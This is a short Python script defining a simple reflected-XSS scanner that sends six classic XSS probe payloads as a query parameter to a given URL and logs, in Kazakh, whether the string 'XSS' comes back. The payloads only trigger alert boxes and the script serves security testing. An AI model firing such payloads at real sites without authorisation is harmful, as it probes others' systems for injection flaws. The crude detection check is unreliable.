import requests


def check_xss(url):
    xss_commands = [
        "<script>alert('XSS')</script>",
        "<img src=\"javascript:alert('XSS')\">",
        "<body onload=alert('XSS')>",
        "\"> <script>alert('XSS')</script>",
        "';!--\"<XSS>=&{()}",
        "\";alert('XSS');//"
    ]
    logMass = []

    for command in xss_commands:
        print("Команда үшін пентест басталды" + command)
        response = requests.get(url + "?param=" + command)
        if "XSS" in response.text:
            logMass.append({"start": "Команда үшін пентест басталды" + command,
                            "text": "Осалдық табылды: " + command})
        else:
            logMass.append({"start": "Команда үшін пентест басталды" + command,
                            "text": "Сынақ сәтті өтті, осалдықтар жоқ.............." + command})
    return logMass
